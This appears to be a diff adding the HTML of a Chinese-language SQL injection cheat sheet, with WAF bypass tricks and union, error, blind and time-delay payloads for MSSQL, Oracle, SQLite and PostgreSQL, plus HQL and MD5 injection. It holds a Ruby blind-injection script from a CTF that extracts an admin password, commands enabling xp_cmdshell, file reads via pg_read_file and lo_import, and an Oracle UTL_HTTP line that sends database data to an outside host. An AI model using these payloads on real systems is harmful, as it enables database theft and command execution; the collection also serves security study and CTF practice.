+<code>select password</code> =&gt; <code>SelEcT password</code> (大小寫)</li>
+<li>
+<code>select password</code> =&gt; <code>select/**/password</code> (繞空白)</li>
+<li>
+<code>select password</code> =&gt; <code>s%65lect%20password</code> (URLencode)</li>
+<li>
+<code>select password</code> =&gt; <code>select(password)</code> (繞空白)</li>
+<li>
+<code>select password</code> =&gt; <code>select%0apassword</code> (繞空白)
+<ul>
+<li>%09, %0a, %0b, %0c, %0d, %a0</li>
+</ul>
+</li>
+<li>
+<code>select password from admin</code> =&gt; <code>select password /*!from*/ admin</code> (MySQL註解)</li>
+<li>
+<code>information_schema.schemata</code> =&gt; <code>`information_schema`.schemata</code> (繞關鍵字/空白)
+<ul>
+<li>
+<code> select xxx from`information_schema`.schemata</code>
+</li>
+</ul>
+</li>
+<li>
+<code>select pass from user where id='admin'</code> =&gt; <code>select pass from user where id=0x61646d696e</code> (繞引號)
+<ul>
+<li>
+<code>id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))</code>
+</li>
+</ul>
+</li>
+<li>
+<code>?id=0e2union select 1,2,3</code> (科學記號)
+<ul>
+<li>
+<code>?id=1union select 1,2,3</code>會爛</li>
+<li>
+<code>?id=0e1union(select~1,2,3)</code> (~)</li>
+<li>
+<code>?id=.1union select 1,2,3</code> (點)</li>
+</ul>
+</li>
+<li>
+<code>WHERE</code> =&gt; <code>HAVING</code> (繞關鍵字)</li>
+<li>
+<code>AND</code> =&gt; <code>&amp;&amp;</code> (繞關鍵字)
+<ul>
+<li>
+<code>OR</code> =&gt; <code>||</code>
+</li>
+<li>
+<code>=</code> =&gt; <code>LIKE</code>
+</li>
+<li>
+<code>a = 'b'</code> =&gt; <code>not a &gt; 'b' and not a &lt; 'b'</code>
+</li>
+<li>
+<code>&gt; 10</code> =&gt; <code>not between 0 and 10</code>
+</li>
+</ul>
+</li>
+<li>
+<code>LIMIT 0,1</code> =&gt; <code>LIMIT 1 OFFSET 0</code> (繞逗號)
+<ul>
+<li>
+<code>substr('kaibro',1,1)</code> =&gt; <code>substr('kaibro' from 1 for 1)</code>
+</li>
+</ul>
+</li>
+<li>Multipart/form-data繞過
+<ul>
+<li>http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/</li>
+</ul>
+</li>
+<li>偽造User-Agent
+<ul>
+<li>e.g. 有些WAF不封google bot</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_MSSQL">MSSQL</h2>
+<h3 id="page_Union_Based-2">Union-Based</h3>
+<ul>
+<li>Column型態必須相同 可用<code>NULL</code>來避免</li>
+<li>Database contents
+<ul>
+<li>
+<code>SELECT * FROM information_schema.tables</code>
+</li>
+<li>
+<code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Error_Based-2">Error-Based</h3>
+<ul>
+<li>利用型別轉換錯誤</li>
+<li>
+<code>id=1 and user=0</code>
+</li>
+</ul>
+<h3 id="page_Blind-2">Blind</h3>
+<ul>
+<li>Conditional Errors
+<ul>
+<li>
+<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code>
+</li>
+</ul>
+</li>
+<li>Conditional Time Delays
+<ul>
+<li>
+<code>MAIT FOR DELAY '0:0:10'</code>
+</li>
+<li>
+<code>WAITFOR DELAY '0:0:10'</code>
+</li>
+<li>
+<code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Other_Knowledges-2">Other Knowledges</h3>
+<ul>
+<li>
+<p>子字串：</p>
+<ul>
+<li>
+<code>SUBSTRING(&quot;abc&quot;, 1, 1) =&gt; 'a'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Ascii function</p>
+<ul>
+<li>
+<code>ascii('A') =&gt; 65 </code>
+</li>
+</ul>
+</li>
+<li>
+<p>Char function</p>
+<ul>
+<li>
+<code>char(65) =&gt; 'a'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Concatenation</p>
+<ul>
+<li>
+<code>+</code>
+</li>
+<li>
+<code>'a'+'b' =&gt; 'ab'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>空白字元</p>
+<ul>
+<li>
+<code>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</code>
+</li>
+</ul>
+</li>
+<li>
+<p>IF語句</p>
+<ul>
+<li>IF condition true-part ELSE false-part</li>
+<li>
+<code>IF (1=1) SELECT 'true' ELSE SELECT 'false'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>註解：</p>
+<ul>
+<li>
+<code>--</code>
+</li>
+<li>
+<code>/**/</code>
+</li>
+</ul>
+</li>
+<li>
+<p>TOP</p>
+<ul>
+<li>MSSQL沒有<code>LIMIT N, M</code>的用法</li>
+<li>
+<code>SELECT TOP 87 * FROM xxx</code> 取最前面87筆</li>
+<li>取第78~87筆
+<ul>
+<li>
+<code>SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>其它：</p>
+<ul>
+<li>db_name()</li>
+<li>user_name()</li>
+<li>@@servername</li>
+<li>host_name()</li>
+</ul>
+</li>
+<li>
+<p>爆DB name</p>
+<ul>
+<li>
+<code>DB_NAME(N)</code>
+</li>
+<li>
+<code>UNION SELECT NULL,DB_NAME(N),NULL--</code>
+</li>
+<li>
+<code>UNION SELECT NULL,name,NULL FROM master ..sysdatabases--</code>
+</li>
+<li>
+<code>SELECT catalog_name FROM information_schema.schemata</code>
+</li>
+<li>
+<code>1=(select name from master.dbo.sysdatabases where dbid=5)</code>
+</li>
+</ul>
+</li>
+<li>
+<p>爆表名</p>
+<ul>
+<li>
+<code>SELECT table_catalog, table_name FROM information_schema.tables</code>
+</li>
+<li>
+<code>SELECT name FROM sysobjects WHERE xtype='U'</code>
+</li>
+<li>
+<code>ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))&gt;0 select 1--</code>
+</li>
+</ul>
+</li>
+<li>
+<p>爆column</p>
+<ul>
+<li>
+<code>SELECT table_catalog, table_name, column_name FROM information_schema.columns</code>
+</li>
+<li>
+<code>SELECT name FROM syscolumns WHERE id=object_id('news')</code>
+</li>
+<li>
+<code>ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)&gt;0 select 1--</code>
+</li>
+</ul>
+</li>
+<li>
+<p>判斷是否站庫分離</p>
+<ul>
+<li>客戶端主機名：<code>select host_name();</code>
+</li>
+<li>服務端主機名：<code>select @@servername; </code>
+</li>
+<li>兩者不同即站庫分離</li>
+</ul>
+</li>
+<li>
+<p>xp_cmdshell</p>
+<ul>
+<li>在MSSQL 2000默認開啟</li>
+<li>MSSQL 2005之後默認關閉</li>
+<li>有sa權限，可透過sp_configure重啟它</li>
+</ul>
+<pre><code>EXEC sp_configure 'show advanced options',1
+RECONFIGURE 
+EXEC sp_configure 'xp_cmdshell',1
+RECONFIGURE
+</code></pre>
+<ul>
+<li>關閉xp_cmdshell</li>
+</ul>
+<pre><code>EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure'xp_cmdshell', 0;
+RECONFIGURE;
+</code></pre>
+</li>
+<li>
+<p>快速查找帶關鍵字的表</p>
+<ul>
+<li>
+<code>SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Unicode繞過</p>
+<ul>
+<li>IIS 對 Unicode 編碼是可以解析的，即 s%u0065lect 會被解析為 select</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_Oracle">Oracle</h2>
+<h3 id="page_UNION_Based">UNION-Based</h3>
+<ul>
+<li>Determining the number of columns
+<ul>
+<li>Column 型態必須相同，可用<code>NULL</code>來避免</li>
+<li>所有的 <code>SELECT</code> 必須包含有效的 <code>FROM</code>
+</li>
+<li>
+<code>UNION SELECT 1, 'aa', null FROM dual</code>
+</li>
+</ul>
+</li>
+<li>Database contents
+<ul>
+<li>庫名
+<ul>
+<li>
+<code>SELECT DISTINCT OWNER FROM ALL_TABLES</code>
+</li>
+</ul>
+</li>
+<li>表名
+<ul>
+<li>
+<code>' UNION SELECT table_name,NULL FROM all_tables--</code>
+</li>
+<li>
+<code>SELECT OWNER, TABLE_NAME FROM ALL_TABLES</code>
+</li>
+</ul>
+</li>
+<li>Column
+<ul>
+<li>
+<code>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--</code>
+</li>
+<li>
+<code>SELECT OWNER, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Retrieve interesting data
+<ul>
+<li>
+<code>' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Error_Based-3">Error-Based</h3>
+<ul>
+<li>
+<code>SELECT * FROM news WHERE id=1 and CTXSYS.DRITHSX.SN(user, (SELECT banner FROM v$version WHERE rownum=1))=1</code>
+</li>
+</ul>
+<h3 id="page_Blind-3">Blind</h3>
+<ul>
+<li>Conditional Errors
+<ul>
+<li>
+<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code>
+</li>
+</ul>
+</li>
+<li>Conditional Time Delay
+<ul>
+<li>
+<code>dbms_pipe.receive_message(('a'),10)</code>
+</li>
+<li>
+<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Out_of_band">Out-of-band</h3>
+<ul>
+<li>
+<code>UTL_HTTP.request('http://kaibro.tw/'||(select user from dual))=1</code>
+</li>
+</ul>
+<h3 id="page_Other_Knowledge">Other Knowledge</h3>
+<ul>
+<li>substring
+<ul>
+<li>
+<code>SUBSTR(&quot;abc&quot;, 1, 1) =&gt; 'a'</code>
+</li>
+</ul>
+</li>
+<li>空白字元
+<ul>
+<li>
+<code>00 0A 0D 0C 09 20</code>
+</li>
+</ul>
+</li>
+<li>semicolon
+<ul>
+<li>
+<code>%3b</code>
+</li>
+</ul>
+</li>
+<li>IF語句
+<ul>
+<li>
+<code>IF condition THEN true-part [ELSE false-part] END IF</code>
+</li>
+</ul>
+</li>
+<li>註解：
+<ul>
+<li>
+<code>--</code>
+</li>
+</ul>
+</li>
+<li>連接字串：
+<ul>
+<li>
+<code>||</code>
+</li>
+</ul>
+</li>
+<li>OFFSET
+<ul>
+<li>SELECT owner FROM all_tables OFFSET 1 ROWS</li>
+</ul>
+</li>
+<li>其它
+<ul>
+<li>
+<code>SYS.DATABASE_NAME</code>
+<ul>
+<li>current database</li>
+</ul>
+</li>
+<li>
+<code>USER</code>
+<ul>
+<li>current user</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>https://www.oracletutorial.com/oracle-basics/oracle-fetch/
+https://www.oracletutorial.com/oracle-administration/oracle-show-tables/</p>
+<h2 id="page_SQLite">SQLite</h2>
+<h3 id="page_Blind-4">Blind</h3>
+<ul>
+<li>Boolean Based
+<ul>
+<li>SECCON 2017 qual SqlSRF</li>
+</ul>
+</li>
+</ul>
+<pre><code class="hljs ruby"><span class="hljs-comment"># encoding: UTF-8</span>
+
+<span class="hljs-comment"># sqlite injection (POST method) (二分搜)</span>
+<span class="hljs-comment"># SECCON sqlsrf爆admin密碼 </span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">'net/http'</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">'uri'</span>
+
+$url = <span class="hljs-string">'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'</span>
+$ans = <span class="hljs-string">''</span>
+
+(<span class="hljs-number">1</span>..<span class="hljs-number">100</span>).each <span class="hljs-keyword">do</span> <span class="hljs-params">|i|</span>
+    l = <span class="hljs-number">48</span>
+    r = <span class="hljs-number">122</span>
+
+    <span class="hljs-keyword">while</span>(l &lt;= r)
+        <span class="hljs-comment">#puts "left: #{l}, right: #{r}"</span>
+        <span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> l == r
+
+        mid = ((l + r) / <span class="hljs-number">2</span>)
+        $query = <span class="hljs-string">"kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,<span class="hljs-subst">#{i}</span>,<span class="hljs-subst">#{i}</span>)) from users where username='admin') &gt; <span class="hljs-subst">#{mid}</span> and '1'='1"</span>
+        
+        res = Net::HTTP.post_form URI($url), {<span class="hljs-string">"user"</span> =&gt; $query, <span class="hljs-string">"pass"</span> =&gt; <span class="hljs-string">"kaibro"</span>, <span class="hljs-string">"login"</span> =&gt; <span class="hljs-string">"Login"</span>}
+        
+        <span class="hljs-keyword">if</span> res.body.<span class="hljs-keyword">include</span>? <span class="hljs-string">'document.location'</span>
+            l = mid + <span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>
+            r = mid
+        <span class="hljs-keyword">end</span>
+
+    <span class="hljs-keyword">end</span>
+    $ans += l.chr
+    puts $ans
+
+<span class="hljs-keyword">end</span>
+</code></pre>
+<h3 id="page_Other_Knowledge-2">Other Knowledge</h3>
+<ul>
+<li>子字串：
+<ul>
+<li>
+<code>substr(“abc&quot;,1,1)   =&gt;   'a'</code>
+</li>
+</ul>
+</li>
+<li>Ascii function:
+<ul>
+<li>
+<code>unicode('d') =&gt; 100</code>
+</li>
+</ul>
+</li>
+<li>legth
+<ul>
+<li>
+<code>length('ab') =&gt; 2</code>
+</li>
+</ul>
+</li>
+<li>Concatenation
+<ul>
+<li>
+<code>||</code>
+</li>
+<li>
+<code>'a' || 'b' =&gt; 'ab'</code>
+</li>
+</ul>
+</li>
+<li>Time Delay
+<ul>
+<li>
+<code>randomblob(100000000)</code>
+</li>
+</ul>
+</li>
+<li>空白字元
+<ul>
+<li>
+<code>0A 0D 0C 09 20</code>
+</li>
+</ul>
+</li>
+<li>Case when
+<ul>
+<li>SQLite沒有<code>if</code>
+</li>
+<li>可以用<code>Case When ... Then ...</code>代替</li>
+<li>
+<code>case when (條件) then ... else ... end</code>
+</li>
+</ul>
+</li>
+<li>註解
+<ul>
+<li>
+<code>--</code>
+</li>
+</ul>
+</li>
+<li>爆表名
+<ul>
+<li>
+<code>SELECT name FROM sqlite_master WHERE type='table'</code>
+</li>
+</ul>
+</li>
+<li>爆表結構(含Column)
+<ul>
+<li>
+<code>SELECT sql FROM sqlite_master WHERE type='table'</code>
+</li>
+</ul>
+</li>
+<li>其他
+<ul>
+<li>
+<code>sqlite_version()</code>
+</li>
+<li>sqlite無法使用<code>\'</code>跳脫單引號</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_PostgreSQL">PostgreSQL</h2>
+<h3 id="page_Union_Based-3">Union-Based</h3>
+<ul>
+<li>Database contents
+<ul>
+<li>
+<code>SELECT * FROM information_schema.tables</code>
+<pre><code>TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
+=====================================================
+MyDatabase dbo Products BASE TABLE
+MyDatabase dbo Users BASE TABLE
+MyDatabase dbo Feedback BASE TABLE
+</code></pre>
+</li>
+<li>
+<code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code>
+<pre><code>TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
+=================================================================
+MyDatabase dbo Users UserId int
+MyDatabase dbo Users Username varchar
+MyDatabase dbo Users Password varchar
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Blind-5">Blind</h3>
+<ul>
+<li>Conditional Errors
+<ul>
+<li>
+<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code>
+</li>
+</ul>
+</li>
+<li>Conditional Time Delay
+<ul>
+<li>
+<code>pg_sleep()</code>
+</li>
+<li>
+<code>repeat()</code>
+</li>
+<li>
+<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="page_Other_Knowledge-3">Other Knowledge</h3>
+<ul>
+<li>
+<p>Substring</p>
+<ul>
+<li>
+<code>substr(&quot;abc&quot;, 1, 1) =&gt; 'a'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>semicolon</p>
+<ul>
+<li>
+<code>%3b</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Ascii function</p>
+<ul>
+<li>
+<code>ascii('x') =&gt; 120</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Char function</p>
+<ul>
+<li>
+<code>chr(65) =&gt; A</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Concatenation</p>
+<ul>
+<li>
+<code>||</code>
+</li>
+<li>
+<code>'a' || 'b' =&gt; 'ab'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Delay function</p>
+<ul>
+<li>
+<code>pg_sleep(5)</code>
+</li>
+<li>
+<code>GENERATE_SERIES(1, 1000000)</code>
+</li>
+<li>
+<code>repeat('a', 10000000)</code>
+</li>
+</ul>
+</li>
+<li>
+<p>空白字元</p>
+<ul>
+<li>
+<code>0A 0D 0C 09 20</code>
+</li>
+</ul>
+</li>
+<li>
+<p>encode / decode</p>
+<ul>
+<li>
+<code>encode('123\\000\\001', 'base64')</code> =&gt; <code>MTIzAAE=</code>
+</li>
+<li>
+<code>decode('MTIzAAE=', 'base64')</code> =&gt; <code>123\000\001</code>
+</li>
+</ul>
+</li>
+<li>
+<p>不支援 limit N, M</p>
+<ul>
+<li>
+<code>limit a offset b</code> 略過前 b 筆，抓出 a 筆出來</li>
+</ul>
+</li>
+<li>
+<p>註解</p>
+<ul>
+<li>
+<code>--</code>
+</li>
+<li>
+<code>/**/</code>
+</li>
+</ul>
+</li>
+<li>
+<p>爆庫名</p>
+<ul>
+<li>
+<code>SELECT datname FROM pg_database</code>
+</li>
+</ul>
+</li>
+<li>
+<p>爆表名</p>
+<ul>
+<li>
+<code>SELECT tablename FROM pg_tables WHERE schemaname='dbname'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>爆Column</p>
+<ul>
+<li>
+<code>SELECT column_name FROM information_schema.columns WHERE table_name='admin'</code>
+</li>
+</ul>
+</li>
+<li>
+<p>Dump all</p>
+<ul>
+<li>
+<code>array_to_string(array(select userid||':'||password from users),',')</code>
+</li>
+</ul>
+</li>
+<li>
+<p>其它</p>
+<ul>
+<li>version()</li>
+<li>current_database()</li>
+<li>user
+<ul>
+<li>current_user</li>
+<li>
+<code>SELECT usename FROM pg_user;</code>
+</li>
+</ul>
+</li>
+<li>current_schema</li>
+<li>current_query()</li>
+<li>inet_server_addr()</li>
+<li>inet_server_port()</li>
+<li>inet_client_addr()</li>
+<li>inet_client_port()</li>
+<li>type conversion
+<ul>
+<li>
+<code>cast(count(*) as text)</code>
+</li>
+</ul>
+</li>
+<li>
+<code>md5('abc')</code>
+</li>
+<li>
+<code>replace('abcdefabcdef', 'cd', 'XX')</code> =&gt; <code>abXXefabXXef</code>
+</li>
+<li>
+<code>pg_read_file(filename, offset, length)</code>
+<ul>
+<li>讀檔</li>
+<li>只能讀data_directory下的</li>
+</ul>
+</li>
+<li>
+<code>pg_ls_dir(dirname)</code>
+<ul>
+<li>列目錄內容</li>
+<li>只能列data_directory下的</li>
+</ul>
+</li>
+<li>PHP的<code>pg_query()</code>可以多語句執行</li>
+<li>
+<code>lo_import()</code>, <code>lo_get()</code>讀檔
+<ul>
+<li>
+<code>select cast(lo_import('/var/lib/postgresql/data/secret') as text)</code> =&gt; <code>18440</code>
+</li>
+<li>
+<code>select cast(lo_get(18440) as text)</code> =&gt; <code>secret_here</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="page_Other">Other</h1>
+<h2 id="page_ORM_injection">ORM injection</h2>
+<p>https://www.slideshare.net/0ang3el/new-methods-for-exploiting-orm-injections-in-java-applications</p>
+<ul>
+<li>Hibernate
+<ul>
+<li>單引號跳脫法
+<ul>
+<li>MySQL中，單引號用<code>\'</code>跳脫</li>
+<li>HQL中，用兩個單引號<code>''</code>跳脫</li>
+<li>
+<code>'abc\''or 1=(SELECT 1)--'</code>
+<ul>
+<li>在HQL是一個字串</li>
+<li>在MySQL是字串+額外SQL語句</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Magic Function法
+<ul>
+<li>PostgreSQL中內建<code>query_to_xml('Arbitary SQL')</code>
+</li>
+<li>Oracle中有<code>dbms_xmlgen.getxml('SQL')</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>HQL injection example (pwn2win 2017)</p>
+<ul>
+<li>
+<p><code>order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select table_name from information_schema.columns limit 1)))',true,false,'')),1)</code></p>
+<ul>
+<li>Output: <code>ERROR: could not stat file &quot;flag&quot;: No such file or directory</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select column_name from information_schema.columns limit 1)))',true,false,'')),1)</code></p>
+<ul>
+<li>Output: <code>ERROR: could not stat file &quot;secret&quot;: No such file or directory</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>order=array_upper(xpath('row',query_to_xml('select (pg_read_file((select secret from flag)))',true,false,'')),1)</code></p>
+<ul>
+<li>Output: <code>ERROR: could not stat file &quot;CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}&quot;: No such file or directory</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_SQL_Injection_with_MD5">SQL Injection with MD5</h2>
+<ul>
+<li>
+<code>$sql = &quot;SELECT * FROM admin WHERE pass = '&quot;.md5($password, true).&quot;'&quot;;</code>
+</li>
+<li>ffifdyop
+<ul>
+<li>md5: <code>276f722736c95d99e921722cf9ed621c</code>
+</li>
+<li>to string: <code>'or'6&lt;trash&gt;</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_HTTP_Parameter_Pollution">HTTP Parameter Pollution</h2>
+<ul>
+<li>
+<code>id=1&amp;id=2&amp;id=3</code>
+<ul>
+<li>ASP.NET + IIS: <code>id=1,2,3</code>
+</li>
+<li>ASP + IIS: <code>id=1,2,3</code>
+</li>
+<li>PHP + Apache: <code>id=3</code>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="page_TEMP">TEMP</h1>
+<p>about information_schema
+https://portswigger.net/web-security/sql-injection/examining-the-database</p>
+    </div>
 
         <nav>
         <ul class="Pager">
